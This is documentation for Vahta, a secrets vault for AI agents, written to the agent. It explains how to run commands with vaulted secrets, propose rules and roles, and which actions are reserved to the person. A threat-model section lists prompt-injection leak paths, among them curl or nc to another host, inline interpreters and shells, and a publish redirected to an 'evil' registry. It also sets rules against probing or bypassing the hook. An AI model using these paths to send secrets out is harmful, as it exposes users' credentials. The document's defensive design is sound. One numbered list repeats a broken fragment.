# Agent usage

How an AI agent should use Vahta so that secrets stay out of its context, and
what it must leave to the person. The mechanics are in [daemon.md](daemon.md).

## The contract

- The agent may **trigger** commands that need secrets.
- The agent never reads a vault value. There is no command that returns one to it.
- The person types the vault password, and any value to store, in the window
  Vahta opens, never in the agent's terminal.

## What the agent does

1. Find what is available: `vahta list` (names, kinds and tiers; no password).
   `vahta check` compares the vault with `vahta.toml`.
2. Run a command with the secrets it needs:

   ```bash
   vahta run --secret OPENAI_API_KEY --as OPENAI_API_KEY=OPENAI_API_KEY -- python my_script.py
   ```

   `--as NAME=VAR` maps a vault name (left) to an environment variable (right).
   Without `--secret`, every name in `vahta.toml` that the vault holds is used.
3. If there is no session, a window asks the person for the password for that
   run. To avoid asking each time, open a session:
   `vahta unlock --secret A --secret B --for 1h --label "why"`. The person
   approves it once; `vahta run` from that process and what it starts then needs
   no window.

   **Unattended.** When the command passes the secret's own rules, the hook
   tells the harness to allow the call, so the person is not asked in the
   harness either (Claude Code, and Codex after `vahta setup --codex`; Cursor
   once its live test is done). That works for one plain command only:
   `vahta run [options] -- PROGRAM ARGS...` with `--secret`, `--as`, `--label`,
   `--ask`, `--reason`, `--vault DIR`, or one `vahta http --secret ... URL` to a host the
   secret is approved for, and nothing else in the Bash call (not a call that
   asks to run outside the sandbox either). Write it that way:
   no `&&`, `;` or pipe, no `cd` first (the call's directory is what counts),
   no `$VAR`, `$(...)` or glob outside single quotes, no `FOO=1` before it, and `vahta` or `vh` by its
   bare name. This removes the harness's question only: a run with no session
   still opens the password window. Anything else still works, but the
   harness may ask. Put the
   pipes and the loops inside a script the rules allow, and run that.
   `vahta list` and `vahta check` need no approval either (Claude Code). See
   [hooks.md](hooks.md#running-unattended-when-the-hook-says-allow).

4. Use the scrubbed output and the exit code. A value in the output is replaced
   by `***REDACTED(NAME)***`; do not try to recover it.
5. If a run is refused (exit 3), the answer names the reason; with `--json` it is
   structured. Fix the command rather than retry it.
6. A secret with no rules cannot be used (exit 3, `no_rules`). Rules come with
   the secret: `vahta add NAME --category C --allow PROGRAM --net ... --reason
   "..."` (see below), or later `vahta bind NAME ...`. The person approves.
   `vahta run --ask` asks the person about one command that the rules do not
   allow.
7. If the hook cut something out of a tool's output that is needed,
6. To get a secret's allowed commands set, propose rules with `vahta bind NAME
   --allow PROGRAM --reason "..."`. The person approves. `vahta run --ask` asks
   the person about one command that the rules do not allow.
7. To call an API with a key, use `vahta http` instead of `vahta run -- curl`:

   ```bash
   vahta http --secret STRIPE_KEY -H 'Authorization: Bearer {STRIPE_KEY}' https://api.stripe.com/v1/balance
   vahta http --secret MAPS_KEY --query key={MAPS_KEY} --json 'https://maps.example.com/geocode?q=Oslo'
   ```

   The key goes only where `{NAME}` stands in a header or `--query` value; the
   URL path and the body never carry it (use `-d '{"q":1}'` for a body that has
   no secret). The secret must be bound to the host: if the answer is `refused:
   ... not approved for HOST` or `... not bound to any host`, propose it with
   `vahta bind NAME --net hosts:api.stripe.com --reason "..."` and wait for the
   person. https only; redirects to another host are not followed. The response
   comes back with the key replaced by `***REDACTED(NAME)***`. Exit 0 is a
   response below 400; 1 is 400 or more.
8. If the hook cut something out of a tool's output that is needed,
   `vahta output allow REF --reason "..."` asks the person to show it
   ([hooks.md](hooks.md)).

## Using a vault from another project

A tool vault (say `~/Projects/ai-tools`, holding a registry token) can serve
commands run in a different project, but only when the person has set it up for
that. Two switches, both the person's: the **vault** says it may be used from
other projects (`vahta remote on`), and each **secret** names the projects it
may be used from (`vahta bind NAME --from /abs/project`, or `from = [...]` in
`vahta.toml`, approved with `vahta bind`).

```bash
vahta run --vault ~/Projects/ai-tools --secret CARGO_REGISTRY_TOKEN -- cargo publish
vahta unlock --vault ~/Projects/ai-tools --secret CARGO_REGISTRY_TOKEN --for 30m
vahta list --vault ~/Projects/ai-tools
```

`--vault DIR` is the vault's project folder (the one holding `.vahta/`); it is
accepted by `run`, `http`, `unlock`, `delegate`, `list` and `check`.

- Use `--vault` only for a vault the person set up for this. Do not go looking
  for other vaults on the machine, and do not ask the person to enable one you
  were not told about.
- A refusal means it is not allowed, not "try another way". A vault that has not
  opted in answers exactly like a folder with no vault, and a secret the vault
  does not name your project for answers like a name it does not have. Do not
  probe, copy the file, or reach the value some other way: the daemon works out
  where you run from the kernel (not from what the client says), notes a client
  that lies about it, and the injection alarm counts it.
- The category rules of the secret apply in full: programs, folders, network,
  tier. The command runs in your directory, not the vault's, so a secret
  restricted to folders of its own project (`dirs`) cannot be used this way.
- A session opened with `--vault` belongs to the pair (that vault, this
  project): it does not cover the same vault from another project, nor use of
  the vault at home. `vahta sessions` shows both.
- `vahta list --vault` shows only the secrets you may use from here.
- A secret whose network is `hosts` (Linux) lets the command open TLS
  connections to the listed hosts and nothing else, so an MCP server or a script
  with `hosts = ["api.github.com"]` reaches its own API. Inside, each listed name
  resolves (through a replaced `/etc/hosts`) to a private loopback address; the
  daemon relays the connection to the real host after checking that the TLS
  server name is that host, without decrypting anything. Other names do not
  resolve, an IP address has no route, a wrong or missing server name is refused
  and journaled as suspicious, and the journal counts connections and bytes per
  host. Port 443 is the default; `host:PORT` lists another (a TLS hello there is
  checked the same way). `*.` wildcards and IP-address entries are not relayed
  (reach those with `vahta http`). With several secrets, only hosts every one of
  them lists are reachable. Programs that do their own DNS or ignore
  `/etc/hosts` (a static binary with a built-in resolver that skips it, DNS over
  HTTPS to an IP) simply fail. On macOS and Windows nothing filters the network:
  `hosts` there is a speed bump (`vahta http` is the controlled way).
- A secret whose network is `none` or `hosts` runs the command with `/run`,
  `/var/run` and `/tmp/.X11-unix` empty (so no local daemon socket gives it a
  way out). `/run/media` and `/run/mnt` (mounted SD cards and sticks) are kept.
  A working directory or absolute path argument elsewhere under `/run` is
  refused up front, because files written there would vanish; put them
  somewhere else. A path the program builds itself is not checked.

## Designing the rules

Design the rules **once, up front**, so the person approves once and is rarely
asked again. Inside the rules you work freely; every `--ask` is a window.

1. Pick the category (`payment`, `server`, `ordinary`, `database`, `publish`,
   `local-only`). Left out, Vahta suggests one from the value and the name; a
   lower one than it expects is shown to the person as a downgrade.
2. Name what the work needs and no more: the programs (`--allow "git push"`, not
   `git`), the folders (`--dir ./scripts`, only for code the agent does not write)
   and the network (`--net hosts:api.vendor.com` and `vahta http` where you can,
   `--net none` for a local job, `--net app` only when the tool needs its own).
3. **Walk through how a prompt injection could misuse this secret**, one path at a
   time, and close each now:
   - a **network tool** (`curl`, `nc`) or an allowed program told to send the
     value to another host: keep the network `none`/`hosts`, or deny `@network`;
   - an **interpreter** (`python -c`, `node -e`): do not allow one bare; name the
     script with its arguments, or deny `@interpreters`;
   - a **shell** (`sh -c '... $KEY ...'`, a launcher): deny `@shells`; do not allow
     `env`, `xargs`, `timeout`;
   - **writing the value to a file** (`cp`, `tee`, `pg_dump -f`) that you or a
     tool then read: allow only programs that cannot, or fix the destination;
   - **another host**: with `hosts`, name only the vendor's own;
   - a **script in the project** you allow or a folder you list: an injected agent
     can rewrite it. Prefer a program with arguments.
   - an **argument or variable that steers an allowed program**: `cargo publish
     --manifest-path /elsewhere/Cargo.toml` still matches `cargo publish`, and
     `NPM_CONFIG_REGISTRY=https://evil npm publish` matches `npm publish`. The
     window shows the arguments beyond the allowed prefix and, for `publish`
     and `payment`, the program gets only a fixed environment (no registry or
     URL overrides), with the dropped names listed. The program's own config
     files (`.npmrc`, `.cargo/config.toml`) can still redirect it: Vahta does
     not read them, so keep them in reviewed code.
4. Then `vahta add` with all of it in one command. The reply repeats the
   category's checklist.

## Proposing a role for a task

A secret's rules say what may ever use it. A **role** says what *this task*
needs, and nothing else: a named template you propose once, the person approves
once, and then you (or a sub-agent you start) work inside it with no window. A
role holds no key and can only narrow:

```
what runs  =  the secret's own rules  ∩  the role  ∩  the session you delegate from
```

1. Think of the narrowest role that does the task. Which secrets? Which
   commands, with their arguments (`stripe balance`, not `stripe`)? Which folder?
   No network (`network = "none"`) unless the task needs it, and then only the
   vendor's hosts. How long (`for`), how many times (`uses`), and only the
   actions it needs (`actions = ["run"]`; add `"http"` only for `vahta http`).
   Put `ask = true` when the person should say yes to every use instead.
2. Write it in `vahta.toml`:

   ```toml
   [roles.balance_check]
   secrets = ["STRIPE_KEY"]
   allow   = ["stripe balance"]
   deny    = ["@shells"]
   network = "hosts"
   hosts   = ["api.stripe.com"]
   for     = "2h"
   uses    = 20
   actions = ["run", "http"]
   ```

3. Run `vahta role balance_check --reason "why"`. If the role is wider than one
   of its secrets' approved rules (a program, a host, a folder or a network the
   secret does not give), the answer says exactly what is wider and no window
   opens: narrow the role and run it again. Otherwise the person reads the role
   in plain words and approves it once, with the password. Only that approved
   copy counts: editing `vahta.toml` later changes nothing until
   `vahta role NAME` is approved again, and `vahta check` reports the
   difference.
4. Work inside it: `vahta delegate --role balance_check -- COMMAND`. The new
   session has the role's secrets that your session covers, lasts no longer than
   the shortest of `--for`, the role's `for` and your own session, and may only
   run commands (and `vahta http`) as the role says. Everything else is refused
   with `RoleForbids`: `reveal`, `copy`, `add`, `bind`, `remove`, `unlock`,
   `role`, `--ask`. A delegation from inside it keeps the role; another role
   there is refused. The `uses` count includes the delegations below it. When
   they are spent, ask the person for a new grant.
5. If a step needs more than the role gives, do not look for a way around it:
   propose a new role, or ask. `vahta role --remove NAME` withdraws one (the
   person approves, and sessions limited to it end).

The person can also open a role session for you with
`vahta unlock --role balance_check`.

## What the agent must not do

- Put a key or password in chat, a commit, a `.env` file or a command line.
- Run `vahta reveal`, `vahta copy` or `vahta _surface`. The hook refuses them: a
  window can be captured and the clipboard can be read.
- Read, edit, copy or redirect into `.vahta/` or Vahta's data directory, or edit
  a harness's hook settings. To pause the hook, ask with `vahta hooks pause
  --for 1h --reason "..."`.
- Run `vahta init` expecting it to complete: it needs the person at the window.
- Encode or split a secret-shaped value to get it past the hook. That is read as
  an injection signal, and several of them lock the sessions.

## Human-only commands

| Command | Why |
|---|---|
| `vahta init` | Creates the vault; the recovery key is shown once, to the person |
| `vahta add`, `reset`, `tier`, `remove` | Change the vault; password required |
| `vahta reveal`, `vahta copy` | Show a value to the person only; always a fresh password |
| `vahta add` (rules) / `vahta bind` (approval) | The agent proposes; the person approves |
| `vahta role` (approval) | The agent proposes a role in `vahta.toml`; the person approves it once |

A session is a *runner*: it can `run` and nothing else (a role session, less: only
what its role allows). `reveal`, `copy` and every
write need a fresh password even inside one.
